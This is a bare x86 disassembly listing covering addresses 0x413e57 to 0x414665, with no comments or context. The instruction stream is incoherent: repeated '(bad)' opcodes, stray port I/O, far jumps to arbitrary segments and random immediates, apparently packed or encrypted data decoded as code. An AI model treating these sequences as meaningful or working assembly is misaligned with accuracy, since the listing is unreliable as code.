  413e57:	pop    edi
  413e58:	into   
  413e59:	adc    al,al
  413e5b:	xor    al,0x7e
  413e5d:	sahf   
  413e5e:	add    eax,0x69e455e1
  413e63:	iret   
  413e64:	adc    BYTE PTR [ebp+esi*4+0x6c],0x76
  413e69:	push   esp
  413e6a:	leave  
  413e6b:	out    0x2a,eax
  413e6d:	cmp    dh,BYTE PTR [edx-0x3d]
  413e70:	out    0xa3,al
  413e72:	adc    DWORD PTR [ecx],ebp
  413e74:	repnz fst QWORD PTR [ecx+0x21a4f2]
  413e7b:	push   edi
  413e7c:	mov    ds:0x229b1797,al
  413e81:	inc    ecx
  413e82:	loope  0x413ecc
  413e84:	lods   al,BYTE PTR ds:[esi]
  413e85:	xor    DWORD PTR [eax-0xce60a18],esp
  413e8b:	pop    ebx
  413e8c:	(bad)  
  413e8d:	mov    ds:0xc13446cd,al
  413e92:	jno    0x413ea9
  413e94:	js     0x413ece
  413e96:	rol    DWORD PTR [eax-0x727fef55],1
  413e9c:	repnz inc edx
  413e9e:	sbb    ch,BYTE PTR [ebx+eiz*4]
  413ea1:	mov    BYTE PTR [edx+0x5a3326ba],bl
  413ea7:	jge    0x413e2a
  413ea9:	xor    ch,BYTE PTR [edx+esi*1+0x43]
  413ead:	in     eax,0x93
  413eaf:	js     0x413e74
  413eb1:	or     eax,0x5b8cf920
  413eb6:	mov    dh,BYTE PTR [edx]
  413eb8:	fadd   QWORD PTR [edi+ecx*1+0x74]
  413ebc:	loop   0x413f08
  413ebe:	add    al,0xa6
  413ec0:	push   0xffffffdf
  413ec2:	inc    ebx
  413ec3:	sub    BYTE PTR [edi-0x1],al
  413ec6:	xor    eax,0xb1acbfc9
  413ecb:	sub    al,BYTE PTR [edx+0x72]
  413ece:	or     cl,BYTE PTR [eax+0x4261b8e9]
  413ed4:	xchg   ebp,eax
  413ed5:	test   bh,dl
  413ed7:	cmp    bh,BYTE PTR [edx+0x155f6371]
  413edd:	jmp    0x8e43:0x988730eb
  413ee4:	and    ah,BYTE PTR [ebp+0x50cef100]
  413eea:	push   eax
  413eeb:	jge    0x413ece
  413eed:	(bad)  
  413eee:	gs cmp al,bh
  413ef1:	in     al,0xbc
  413ef3:	push   esi
  413ef4:	test   DWORD PTR [ebp-0x1a],0xbe66a5c6
  413efb:	imul   ebp,DWORD PTR [ebx-0x2],0xffffffe7
  413eff:	gs and al,0x29
  413f02:	xor    esi,esi
  413f04:	xchg   ecx,eax
  413f05:	addr16 into 
  413f07:	xchg   esi,eax
  413f08:	outs   dx,DWORD PTR ds:[esi]
  413f09:	test   ecx,esi
  413f0b:	xor    eax,DWORD PTR [ecx]
  413f0d:	mov    ecx,DWORD PTR [edx]
  413f0f:	mov    WORD PTR [ebx-0x54],?
  413f12:	sahf   
  413f13:	sbb    eax,0x685bc2e7
  413f18:	stos   BYTE PTR es:[edi],al
  413f19:	mov    esp,DWORD PTR [edx+0x63]
  413f1c:	lods   eax,DWORD PTR ds:[esi]
  413f1d:	jne    0x413f87
  413f1f:	es and esp,0xcaaf84d2
  413f26:	inc    esi
  413f27:	add    al,0x7f
  413f29:	ins    DWORD PTR es:[edi],dx
  413f2a:	mov    edi,0x64f252d4
  413f2f:	dec    edi
  413f30:	mov    bl,0x7a
  413f32:	out    dx,eax
  413f33:	(bad)  
  413f34:	jle    0x413ee9
  413f36:	xor    edi,DWORD PTR [ebp-0x28690731]
  413f3c:	adc    al,0xda
  413f3e:	and    ebx,eax
  413f40:	xlat   BYTE PTR ds:[ebx]
  413f41:	lea    edi,[edx+0x3c53f916]
  413f47:	ds jmp 0xf2dd7271
  413f4d:	sbb    BYTE PTR [eax+ebp*8],dh
  413f50:	popf   
  413f51:	ds and al,0xd6
  413f54:	mov    dl,BYTE PTR [eax+0x73ae10bf]
  413f5a:	stos   DWORD PTR es:[edi],eax
  413f5b:	daa    
  413f5c:	adc    eax,0xa3fbb92d
  413f61:	retf   0x7255
  413f64:	add    eax,0x464e22ea
  413f69:	and    BYTE PTR [eax+0x34767957],ah
  413f6f:	gs inc edi
  413f71:	push   ebp
  413f72:	inc    ebp
  413f73:	dec    esi
  413f74:	pop    ebx
  413f75:	rol    BYTE PTR ds:0x968bce51,cl
  413f7b:	ja     0x413f61
  413f7d:	or     eax,0x694b183d
  413f82:	fld    DWORD PTR [ebx]
  413f84:	push   0x3444958
  413f89:	arpl   WORD PTR [ecx],dx
  413f8b:	lods   al,BYTE PTR ds:[esi]
  413f8c:	or     eax,0x41fdd3b3
  413f91:	clc    
  413f92:	ja     0x413fb3
  413f94:	pop    ecx
  413f95:	lock sbb eax,0x47e3d1fa
  413f9b:	into   
  413f9c:	pop    edx
  413f9d:	pop    esp
  413f9e:	sahf   
  413f9f:	jne    0x414012
  413fa1:	stos   DWORD PTR es:[edi],eax
  413fa2:	lock in al,dx
  413fa4:	mov    eax,ds:0x5e6abd8f
  413fa9:	pop    ebp
  413faa:	in     eax,dx
  413fab:	push   ebp
  413fac:	lahf   
  413fad:	ret    0x937b
  413fb0:	stos   BYTE PTR es:[edi],al
  413fb1:	push   esp
  413fb2:	loope  0x413f3e
  413fb4:	je     0x413f3b
  413fb6:	adc    al,0xce
  413fb8:	push   0xffffffbd
  413fba:	cdq    
  413fbb:	mov    ebp,0x52ce0490
  413fc0:	push   0xf7098bfe
  413fc5:	loop   0x413f88
  413fc7:	shr    BYTE PTR [ecx-0x1d773462],0x12
  413fce:	adc    DWORD PTR [bp+di],ebx
  413fd1:	aaa    
  413fd2:	dec    edx
  413fd3:	inc    edi
  413fd4:	or     eax,0xb8940802
  413fd9:	pop    edx
  413fda:	jmp    0xb0ad:0x7ed6f7af
  413fe1:	aas    
  413fe2:	ficom  WORD PTR fs:[edx]
  413fe5:	retf   0xfe15
  413fe8:	jge    0x413f9f
  413fea:	pcmpgtw mm3,mm7
  413fed:	ret    0x3d45
  413ff0:	shl    DWORD PTR [eax],0xf
  413ff3:	and    ecx,DWORD PTR [edi]
  413ff5:	test   al,0x34
  413ff7:	adc    DWORD PTR [eax-0x5c1f7c33],ebx
  413ffd:	cmp    eax,0xa61b9322
  414002:	push   esp
  414003:	popf   
  414004:	pop    es
  414005:	fisub  WORD PTR [ecx-0x5e1290c2]
  41400b:	xchg   edx,eax
  41400c:	pop    ebx
  41400d:	(bad)
  414010:	ds cdq 
  414012:	shr    DWORD PTR [ebx+0x38db3ace],cl
  414018:	mov    ebx,0xad4f7d53
  41401d:	scas   eax,DWORD PTR es:[edi]
  41401e:	xchg   esp,eax
  41401f:	das    
  414020:	jno    0x414010
  414022:	pop    ebx
  414023:	cmp    ah,BYTE PTR [esi]
  414025:	sar    esp,0xc4
  414028:	fnstenv [esi+eiz*1+0x683eb105]
  41402f:	sbb    dh,BYTE PTR [edi]
  414031:	mov    cl,0xdc
  414033:	xor    al,0xa0
  414035:	and    esi,ebp
  414037:	lods   al,BYTE PTR ds:[esi]
  414038:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414039:	pop    esi
  41403a:	stos   BYTE PTR es:[edi],al
  41403b:	mov    ds:0x38543099,al
  414040:	scas   eax,DWORD PTR es:[edi]
  414041:	icebp  
  414042:	mov    eax,0x16bf195d
  414047:	cwde   
  414048:	adc    BYTE PTR [ebx-0x511cf333],bh
  41404e:	pushf  
  41404f:	inc    eax
  414050:	in     eax,dx
  414051:	mov    ah,0x4
  414053:	mov    ebp,0x764f9cb
  414058:	popa   
  414059:	or     DWORD PTR [ecx+ebp*1+0x21529902],edx
  414060:	pop    ebp
  414062:	cmp    eax,0x2c4e926
  414067:	addr16 out dx,al
  414069:	push   ebx
  41406a:	ret    0xf4c6
  41406d:	jg     0x41404f
  41406f:	cmc    
  414070:	cld    
  414071:	sbb    eax,0x395b3b1c
  414076:	sar    bl,1
  414078:	pop    es
  414079:	jne    0x4140f8
  41407b:	pop    ss
  41407c:	push   es
  41407d:	push   es
  41407e:	sub    edx,DWORD PTR [ebp-0x75]
  414081:	fistp  QWORD PTR ds:0x6ec51210
  414087:	push   ebx
  414088:	je     0x414060
  41408a:	cmp    eax,0xe85637b9
  41408f:	add    BYTE PTR [edi+0x6fd4ff19],0xd7
  414096:	call   0x5b06:0x47a49bc7
  41409d:	fidiv  WORD PTR [esi+0x4121f6a8]
  4140a3:	mov    cl,0x9f
  4140a5:	fisubr DWORD PTR [edx+eiz*8-0x19]
  4140a9:	loope  0x41402d
  4140ab:	test   al,0xcf
  4140ad:	mov    al,0x95
  4140af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4140b0:	ins    DWORD PTR es:[edi],dx
  4140b1:	scas   al,BYTE PTR es:[edi]
  4140b2:	pop    DWORD PTR [ebx]
  4140b4:	mov    esp,0x67524467
  4140b9:	mov    ebp,0x5dfac7f7
  4140be:	xchg   ebx,eax
  4140bf:	jbe    0x414065
  4140c1:	mov    bl,0x98
  4140c3:	mov    ebp,0xe4bce53b
  4140c8:	dec    BYTE PTR ds:0x7e935d01
  4140ce:	add    bl,BYTE PTR [eax]
  4140d0:	in     eax,0x73
  4140d2:	fs pop esp
  4140d4:	rcl    BYTE PTR [esi],0x7e
  4140d7:	repz mov eax,0x89125949
  4140dd:	mov    edi,esi
  4140df:	pop    edi
  4140e0:	out    0xff,eax
  4140e2:	das    
  4140e3:	pop    ss
  4140e4:	out    dx,eax
  4140e5:	icebp  
  4140e6:	repnz shl DWORD PTR [ecx+0x4f5841b7],0x39
  4140ee:	jecxz  0x41416d
  4140f0:	ins    BYTE PTR es:[edi],dx
  4140f1:	dec    esi
  4140f2:	jecxz  0x4140eb
  4140f4:	ins    BYTE PTR es:[edi],dx
  4140f5:	aad    0xdc
  4140f7:	enter  0xaef3,0x49
  4140fb:	xor    DWORD PTR [edi],edi
  4140fd:	pop    ebp
  4140fe:	popfw  
  414100:	ins    BYTE PTR es:[edi],dx
  414101:	retf   
  414102:	and    dl,BYTE PTR ss:[eax-0x6f444bdf]
  414109:	out    dx,al
  41410a:	mov    BYTE PTR [ebx+0x3c6df7b1],ah
  414110:	inc    esi
  414111:	ret    
  414112:	pop    ss
  414113:	pop    ss
  414114:	and    al,0x9f
  414116:	push   ebx
  414117:	out    dx,al
  414118:	sub    BYTE PTR [edi+ebx*4],ch
  41411b:	int3   
  41411c:	fstp   QWORD PTR [ebp+ecx*8-0x1]
  414120:	mov    ah,0xb6
  414122:	pop    ebx
  414123:	and    BYTE PTR ds:0xc1a495ca,al
  414129:	or     eax,0x8232cfbe
  41412e:	not    DWORD PTR [edi+esi*2+0x370dd33e]
  414135:	inc    ecx
  414136:	pop    ecx
  414137:	in     al,0xcb
  414139:	push   esp
  41413a:	popf   
  41413b:	sbb    ch,bh
  41413d:	xlat   BYTE PTR ds:[ebx]
  41413e:	xor    cl,dh
  414140:	adc    edx,ecx
  414142:	push   0xffffff91
  414144:	sub    eax,edi
  414146:	mov    dl,0x17
  414148:	dec    edx
  414149:	push   DWORD PTR [ebx]
  41414b:	push   es
  41414c:	shr    BYTE PTR [ebp+0xca7d330],0x51
  414153:	je     0x414144
  414155:	mov    cl,0x43
  414157:	scas   al,BYTE PTR es:[edi]
  414158:	es lock aas 
  41415b:	aas    
  41415c:	sahf   
  41415d:	add    DWORD PTR [esi+esi*2-0x70cb1d23],esi
  414164:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414165:	mov    eax,ds:0x5d72b61b
  41416a:	sub    ebp,edi
  41416c:	in     al,dx
  41416d:	xor    al,0xcd
  41416f:	in     al,dx
  414170:	ss push 0x8
  414173:	retf   0x5db3
  414176:	pushf  
  414177:	rep stos BYTE PTR es:[edi],al
  414179:	fs push esp
  41417b:	lods   eax,DWORD PTR ds:[esi]
  41417c:	outs   dx,BYTE PTR ds:[esi]
  41417d:	lea    ecx,[ebp+0x2607820c]
  414183:	inc    edx
  414184:	jmp    0x7673:0x2020fd1b
  41418b:	data16 ja 0x4141b5
  41418e:	mov    DWORD PTR [ebx+0x61],ebp
  414191:	dec    edi
  414192:	push   es
  414193:	jp     0x4141f4
  414195:	inc    ebx
  414196:	leave  
  414197:	loopne 0x414169
  414199:	cmp    BYTE PTR [ecx-0x53],ah
  41419c:	popf   
  41419d:	cmp    esi,ebp
  41419f:	jb     0x414159
  4141a1:	cmp    BYTE PTR ds:0x8b95a4b5,ch
  4141a7:	mov    ?,WORD PTR [ecx-0xc]
  4141aa:	xchg   ecx,eax
  4141ab:	or     eax,0xb39ec394
  4141b0:	jecxz  0x4141c3
  4141b2:	scas   al,BYTE PTR es:[edi]
  4141b3:	(bad)  [ebp-0x6d215aa6]
  4141b9:	sub    al,0x50
  4141bb:	jmp    0x4141ec
  4141bd:	add    eax,0x13734729
  4141c2:	scas   eax,DWORD PTR es:[edi]
  4141c3:	sbb    ah,BYTE PTR [esi+0x22a8d0e2]
  4141c9:	ss ds bnd jns 0x414174
  4141ce:	addr16 cs addr16 and al,0x18
  4141d3:	loopne 0x414228
  4141d5:	mov    dl,0x77
  4141d7:	in     al,dx
  4141d8:	ds fs jecxz 0x414182
  4141dc:	adc    eax,0x8835ac1f
  4141e1:	cdq    
  4141e2:	fnsave [eax]
  4141e4:	mov    edi,0xafdde99d
  4141e9:	out    0xf4,al
  4141eb:	sahf   
  4141ec:	jl     0x4141aa
  4141ee:	pusha  
  4141ef:	xor    dl,BYTE PTR [edi*4+0x6e9a22d8]
  4141f6:	dec    edi
  4141f7:	mov    ah,0xf4
  4141f9:	rcr    ecx,1
  4141fb:	push   edx
  4141fc:	sbb    DWORD PTR [ebx],ebx
  4141fe:	loop   0x4141d5
  414200:	pop    esi
  414201:	push   ebp
  414202:	sbb    eax,0xc4fc9d36
  414207:	stc    
  414208:	cmp    al,0x9d
  41420a:	dec    ebp
  41420b:	mov    bl,BYTE PTR [edi+0x9f1e500]
  414211:	pop    esi
  414212:	dec    ebp
  414213:	mov    WORD PTR [ecx-0x2a],cs
  414216:	arpl   WORD PTR [edi+ebp*8-0x5b],ax
  41421a:	dec    ebp
  41421b:	rcr    DWORD PTR [esi-0x5f4f7cb3],1
  414221:	xor    BYTE PTR [ebx+0x46],0x30
  414225:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414226:	fiadd  WORD PTR [edi-0x18]
  414229:	retf   
  41422a:	or     DWORD PTR [eax-0x13],esi
  41422d:	sub    BYTE PTR [ebx-0x22],al
  414230:	push   esi
  414231:	or     eax,0x79c361dc
  414236:	mov    edi,0x11b0e8c9
  41423b:	pushf  
  41423c:	xchg   ebp,eax
  41423d:	mov    eax,0xa750855c
  414242:	xchg   esi,eax
  414243:	mov    dh,0xe3
  414245:	jle    0x4142ac
  414247:	dec    ebx
  414248:	inc    eax
  414249:	cmp    eax,0x1fce247
  41424e:	shr    BYTE PTR [esi],1
  414250:	sbb    al,0x51
  414252:	inc    edx
  414253:	sbb    esp,DWORD PTR ds:0xce58a11c
  414259:	cmp    eax,0xe1d1e5b3
  41425e:	dec    ebx
  41425f:	shl    esi,0x35
  414262:	add    eax,0x36654c2
  414267:	mov    ?,WORD PTR [ebx+eiz*8+0x35102fc8]
  41426e:	mov    ?,WORD PTR [edi]
  414270:	mov    DWORD PTR [esi+0x66fccff9],esi
  414276:	fmul   QWORD PTR [edi]
  414278:	mov    ah,BYTE PTR [edx]
  41427a:	mov    edx,0x6e3927b8
  41427f:	stos   BYTE PTR es:[edi],al
  414280:	pop    es
  414281:	fnstsw WORD PTR [edi]
  414283:	mov    bl,0x1d
  414285:	mov    ebx,0xf6e4845a
  41428a:	add    bh,BYTE PTR [ecx-0x39]
  41428d:	dec    esi
  41428e:	sub    bl,dh
  414290:	pop    ds
  414291:	mov    cl,0x6
  414293:	mov    bh,0x51
  414295:	adc    ecx,eax
  414297:	adc    DWORD PTR [ecx],edx
  414299:	xor    al,0x7
  41429b:	fcom   QWORD PTR [ebp+0x4f]
  41429e:	mov    cl,0xc2
  4142a0:	fisub  WORD PTR [eax+0x6cc77ba]
  4142a6:	mov    cl,0x57
  4142a8:	sar    DWORD PTR [ebp-0x349aebe4],1
  4142ae:	daa    
  4142af:	or     DWORD PTR [esi+ebp*4-0x67],esp
  4142b3:	xor    eax,0x5f9ed687
  4142b8:	mov    eax,ds:0x2778a850
  4142bd:	enter  0x57a,0x34
  4142c1:	adc    DWORD PTR [ebp+0x7cadb3df],esi
  4142c7:	xchg   BYTE PTR [ebx-0x18650ef2],bh
  4142cd:	push   ebx
  4142ce:	mov    cs,WORD PTR [edx]
  4142d0:	ss clc 
  4142d2:	pop    ecx
  4142d3:	pop    esi
  4142d4:	sbb    bl,dh
  4142d6:	sar    BYTE PTR [eax+0x3529df17],1
  4142dc:	loope  0x414319
  4142de:	cmp    BYTE PTR [edi+eax*4],dh
  4142e1:	lea    edi,[eax-0x40]
  4142e4:	and    DWORD PTR [ebp-0x39],ebp
  4142e7:	lock pop es
  4142e9:	test   eax,0x3b29f9de
  4142ee:	and    al,0xec
  4142f0:	mov    ah,0x7a
  4142f2:	or     BYTE PTR [edi-0x68],dl
  4142f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4142f6:	cwde   
  4142f7:	imul   ecx,DWORD PTR gs:[eax-0x53],0x7f98add3
  4142ff:	fwait
  414300:	ins    BYTE PTR es:[edi],dx
  414301:	fiadd  DWORD PTR [ebx]
  414303:	sbb    DWORD PTR [ebx],esp
  414305:	inc    eax
  414306:	pop    esp
  414307:	dec    ebx
  414308:	mov    edi,0x8db8bd51
  41430d:	fst    DWORD PTR ds:[ebp-0x6b]
  414311:	mov    ds:0x26bca205,al
  414316:	and    BYTE PTR [ecx-0x27ddb5ea],cl
  41431c:	jmp    0x2b18:0x778bd7de
  414323:	(bad)  
  414324:	push   ebx
  414325:	fistp  QWORD PTR [edx+edx*2-0x15]
  414329:	lds    esp,FWORD PTR [edi-0x488f5918]
  41432f:	jnp    0x41430e
  414331:	(bad)  
  414332:	clc    
  414333:	ror    BYTE PTR [edx],0x54
  414336:	cmp    edx,DWORD PTR [edi-0x2df4c125]
  41433c:	pop    ebx
  41433d:	bound  esi,QWORD PTR [eax+0x5b]
  414340:	shl    BYTE PTR [eax-0x31],1
  414343:	xor    DWORD PTR [esi-0x4a8c874e],esp
  414349:	inc    edi
  41434a:	sub    bh,BYTE PTR [ebp-0x716662e1]
  414350:	sbb    BYTE PTR [esi-0x10],dl
  414353:	rcl    BYTE PTR [ecx+0x54b617b2],cl
  414359:	(bad)
  41435f:	call   0x37f:0xc8d6df56
  414366:	sub    ah,BYTE PTR [ecx]
  414368:	popf   
  414369:	pusha  
  41436a:	mov    ds:0x91c98ee4,al
  41436f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414370:	inc    esi
  414371:	mov    al,ds:0xdcb7ed0d
  414376:	cli    
  414377:	and    DWORD PTR [ebx],esi
  414379:	add    bl,BYTE PTR es:[eax+edi*2]
  41437d:	gs test al,0x6b
  414380:	mov    eax,0xa81220c2
  414385:	add    bh,BYTE PTR [esi+0x41]
  414388:	push   ss
  414389:	pop    es
  41438a:	add    DWORD PTR [edx],0xe6f710b7
  414390:	xchg   edi,eax
  414391:	mov    WORD PTR [edx+eiz*4],cs
  414394:	jne    0x4143af
  414396:	xchg   edi,eax
  414397:	jmp    0xcd5c:0xd91e1928
  41439e:	loop   0x414415
  4143a0:	ret    
  4143a1:	jg     0x41441a
  4143a3:	lds    ebx,FWORD PTR [esi+0x41]
  4143a6:	inc    edx
  4143a7:	rol    cl,cl
  4143a9:	or     cl,dh
  4143ab:	push   ebx
  4143ac:	sub    eax,0x357344e7
  4143b1:	pop    ss
  4143b2:	pusha  
  4143b3:	rcl    DWORD PTR [ebx+esi*8],0x59
  4143b7:	popa   
  4143b8:	pop    eax
  4143b9:	aad    0xdd
  4143bb:	stc    
  4143bc:	es sub ch,ah
  4143bf:	add    eax,0x99dcc98f
  4143c4:	test   al,0xf4
  4143c6:	add    BYTE PTR [esi-0x1],0x18
  4143ca:	dec    ebx
  4143cb:	jmp    0x41443f
  4143cd:	pusha  
  4143ce:	push   edi
  4143cf:	stos   DWORD PTR es:[edi],eax
  4143d0:	pop    eax
  4143d1:	mov    ?,WORD PTR [edx+0x2db3211a]
  4143d7:	cmp    BYTE PTR [ebp+0x42d7858a],al
  4143dd:	loopne 0x414418
  4143df:	sbb    al,0x82
  4143e1:	dec    BYTE PTR [edx*1-0x381213f1]
  4143e8:	xchg   esi,eax
  4143e9:	push   ds
  4143ea:	loopne 0x41443c
  4143ec:	aad    0xd7
  4143ee:	push   ecx
  4143ef:	sub    eax,0xef274bb7
  4143f4:	outs   dx,BYTE PTR ds:[esi]
  4143f5:	fcmove st,st(4)
  4143f7:	inc    edx
  4143f8:	cdq    
  4143f9:	mov    DWORD PTR [ecx+0x7024837a],esp
  4143ff:	sahf   
  414400:	mov    eax,DWORD PTR [eax]
  414402:	sbb    esp,esi
  414404:	lahf   
  414405:	repnz mov eax,0x556fba93
  41440b:	arpl   WORD PTR [eax+0x6f],bx
  41440e:	cmp    cl,bh
  414410:	jge    0x4143d7
  414412:	scas   al,BYTE PTR es:[edi]
  414413:	mov    ch,0xfc
  414415:	cmc    
  414416:	adc    esp,ebp
  414418:	and    ax,0xe8cb
  41441c:	fst    DWORD PTR [edx+0x64]
  41441f:	out    dx,al
  414420:	shl    BYTE PTR [ecx],cl
  414422:	in     al,dx
  414423:	xadd   esi,esi
  414426:	data16 into 
  414428:	mov    dh,0xf2
  41442a:	mov    ecx,0x21ce7efa
  41442f:	mov    ecx,0x598c0a14
  414434:	adc    al,0x69
  414436:	push   esi
  414437:	push   esp
  414438:	mov    ebp,0x8493a023
  41443d:	sub    al,0x59
  41443f:	cmp    ecx,DWORD PTR [esi-0x299b680b]
  414445:	lock int 0xf4
  414448:	ds pop esp
  41444b:	repnz pushf 
  41444d:	out    0x7b,eax
  41444f:	call   0xacde5d06
  414454:	gs push es
  414456:	ja     0x41442c
  414458:	cli    
  414459:	daa    
  41445a:	call   0xc357:0x58f78801
  414461:	fistp  QWORD PTR [esi-0x68e8b2e1]
  414467:	dec    ebp
  414468:	mov    ds:0x8e753f74,al
  41446d:	jle    0x41446b
  41446f:	loope  0x4144c2
  414471:	push   ebx
  414472:	xor    eax,DWORD PTR [edi-0x9a15321]
  414478:	sbb    dl,0x27
  41447b:	lods   eax,DWORD PTR fs:[esi]
  41447d:	push   cs
  41447e:	aam    0x50
  414480:	les    ebp,FWORD PTR [ebx]
  414482:	jno    0x4144a2
  414484:	pop    ecx
  414485:	jp     0x414433
  414487:	cdq    
  414488:	cmp    eax,DWORD PTR [edx-0x386f447d]
  41448e:	outs   dx,DWORD PTR ds:[esi]
  41448f:	clc    
  414490:	pop    ebx
  414491:	add    eax,0x35064328
  414496:	push   esi
  414497:	push   ss
  414498:	xchg   esp,eax
  414499:	mov    edi,0x8e347408
  41449e:	mov    eax,ebp
  4144a0:	ds leave 
  4144a2:	or     bh,BYTE PTR [ebp+0x68649b32]
  4144a8:	sub    eax,0xc5be2d57
  4144ad:	jae    0x4144ae
  4144af:	push   ss
  4144b0:	(bad)  
  4144b1:	mov    esp,0xf359cdb7
  4144b6:	(bad)  
  4144b7:	dec    ebp
  4144b8:	xor    edi,esp
  4144ba:	in     eax,dx
  4144bb:	mov    ds:0xb3c2205f,al
  4144c0:	out    dx,eax
  4144c1:	mov    dl,0xff
  4144c3:	imul   esi,DWORD PTR [ebp-0x7a2c34d3],0xfffffff4
  4144ca:	cwde   
  4144cb:	jns    0x414522
  4144cd:	call   0xa3927cbf
  4144d2:	xor    ah,bh
  4144d4:	call   0x58ce:0x7a96ba8e
  4144db:	mov    ch,0xee
  4144dd:	fmul   QWORD PTR [esi]
  4144df:	mov    esi,0x8335852e
  4144e4:	dec    ebp
  4144e5:	or     edx,DWORD PTR [edx+0xc55628b]
  4144eb:	imul   eax,edi,0x498e4987
  4144f1:	idiv   BYTE PTR [edi+ebx*8+0x71ac72ba]
  4144f8:	dec    esp
  4144f9:	stc    
  4144fa:	imul   esi,DWORD PTR [esi+0x3e],0x1d
  4144fe:	jecxz  0x4144df
  414500:	cwde   
  414501:	mov    BYTE PTR [eax-0x38eaceee],ah
  414507:	test   DWORD PTR ds:0x6f135d74,ecx
  41450d:	js     0x4144a2
  41450f:	xlat   BYTE PTR ds:[ebx]
  414510:	mov    ?,WORD PTR [esi]
  414512:	inc    ebp
  414513:	pop    esp
  414514:	out    dx,al
  414515:	or     BYTE PTR [ebp-0x48aab0e0],bh
  41451b:	and    BYTE PTR [edx+0xd],al
  41451e:	call   0x7a592fd4
  414523:	ins    BYTE PTR es:[edi],dx
  414524:	adc    al,0x23
  414526:	retf   
  414527:	popa   
  414528:	in     eax,dx
  414529:	jecxz  0x4144ab
  41452b:	sbb    eax,0x3cbb5d71
  414530:	or     ebx,DWORD PTR [eax]
  414532:	out    0xa1,al
  414534:	xchg   ebx,eax
  414535:	(bad)  
  414536:	pop    edx
  414537:	fnstsw WORD PTR [ebx-0x44]
  41453a:	or     al,0x6f
  41453c:	mov    al,0x4b
  41453e:	mov    WORD PTR ds:0xebc21629,ss
  414544:	or     esi,ebx
  414546:	or     bl,bl
  414548:	sub    DWORD PTR [esi-0x71],ebx
  41454b:	mov    esp,0x7227dfcd
  414550:	jmp    0xd5276343
  414555:	rcl    BYTE PTR [esi-0x49f6237],cl
  41455b:	cmp    DWORD PTR [ecx+0x28803d31],eax
  414561:	or     BYTE PTR [edi+0x17],0x3
  414565:	mov    al,ds:0xd9f14c5e
  41456a:	in     al,dx
  41456b:	jb     0x4145c3
  41456d:	mov    bl,0x9e
  41456f:	mov    WORD PTR [edi-0xcea3da2],ds
  414575:	jnp    0x41454a
  414577:	shl    DWORD PTR [edx+edx*2+0x69c14b9f],1
  41457e:	add    DWORD PTR ds:0xde0e2197,ebp
  414584:	arpl   WORD PTR [ecx+ecx*2],si
  414587:	shl    DWORD PTR [ebp-0x31ec694b],0x87
  41458e:	add    eax,0x1f085e04
  414593:	dec    esp
  414594:	(bad)  
  414595:	sub    WORD PTR [esi-0xf7148a],ax
  41459c:	idiv   BYTE PTR [edi+0x644acd7c]
  4145a2:	loop   0x41457a
  4145a4:	outs   dx,BYTE PTR ds:[esi]
  4145a5:	loopne 0x4145dd
  4145a7:	xor    BYTE PTR [ebx+0x2bcd75a],bl
  4145ad:	push   ss
  4145ae:	xchg   esp,eax
  4145af:	inc    esp
  4145b0:	aad    0x29
  4145b2:	in     al,0xec
  4145b4:	jg     0x4145d8
  4145b6:	ret    0x6e8e
  4145b9:	mov    bl,ch
  4145bb:	xchg   ebx,eax
  4145bc:	fdivr  st(3),st
  4145be:	ret    0x86fb
  4145c1:	js     0x4145d8
  4145c3:	loope  0x414591
  4145c5:	dec    esp
  4145c6:	cmp    al,0xe7
  4145c8:	mov    cl,BYTE PTR [ecx]
  4145ca:	sbb    esi,DWORD PTR [esi+0x10fb6b5d]
  4145d0:	mov    ecx,0x5a99f052
  4145d5:	mov    DWORD PTR cs:[ebx+edx*8],eax
  4145d9:	call   0xc2ffd940
  4145de:	scas   eax,DWORD PTR es:[edi]
  4145df:	dec    esp
  4145e0:	mov    cl,0x19
  4145e2:	xchg   ebp,eax
  4145e3:	jg     0x4145c9
  4145e5:	push   cs
  4145e6:	shr    BYTE PTR [edx-0x73],0x19
  4145ea:	inc    esi
  4145eb:	or     al,0x1d
  4145ed:	pop    edi
  4145ee:	stos   DWORD PTR es:[edi],eax
  4145ef:	inc    eax
  4145f0:	icebp  
  4145f1:	xchg   DWORD PTR [ebx+0x6a],esi
  4145f4:	loopne 0x4145c5
  4145f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4145f7:	sub    DWORD PTR es:[ecx],ecx
  4145fa:	int3   
  4145fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4145fc:	pop    edx
  4145fd:	shr    BYTE PTR [edx],1
  4145ff:	jb     0x4145ae
  414601:	xlat   BYTE PTR ds:[ebx]
  414602:	aam    0x11
  414604:	bound  esp,QWORD PTR [ecx+0x597a81a1]
  41460a:	outs   dx,DWORD PTR ds:[esi]
  41460b:	xor    ebp,DWORD PTR [esi]
  41460d:	add    edx,eax
  41460f:	sbb    eax,0xac3f50b1
  414614:	dec    edi
  414615:	outs   dx,DWORD PTR ds:[esi]
  414616:	lock jl 0x41462b
  414619:	test   BYTE PTR [ecx-0x6c],al
  41461c:	bound  ebx,QWORD PTR [ecx-0x8]
  41461f:	popa   
  414620:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414621:	int    0x62
  414623:	and    esp,DWORD PTR [edx+0x58]
  414626:	jne    0x4145ab
  414628:	sub    edx,DWORD PTR [ebp+0x6f]
  41462b:	lds    ebp,FWORD PTR [esi-0x7]
  41462e:	add    eax,0xe9f0e026
  414633:	or     eax,0xa1fa105a
  414638:	mov    BYTE PTR [ecx],ch
  41463a:	dec    eax
  41463b:	inc    ebx
  41463c:	xchg   edx,eax
  41463d:	mov    DWORD PTR ds:0x720e6cc,edx
  414643:	mov    dh,0xa9
  414645:	inc    esi
  414646:	push   ss
  414647:	push   ebx
  414648:	cmp    al,0x80
  41464a:	sbb    al,0xcf
  41464c:	out    0xb4,eax
  41464e:	jmp    0x41463b
  414650:	add    dh,ah
  414652:	or     edi,ebp
  414654:	aam    0x21
  414656:	pop    eax
  414657:	rol    BYTE PTR [ecx],1
  414659:	cld    
  41465a:	and    al,0x7f
  41465c:	ins    DWORD PTR es:[edi],dx
  41465d:	adc    dl,BYTE PTR cs:[esi]
  414660:	jns    0x41469d
  414662:	dec    ebx
  414663:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414664:	(bad)  
  414665:	jne    0x4145fe
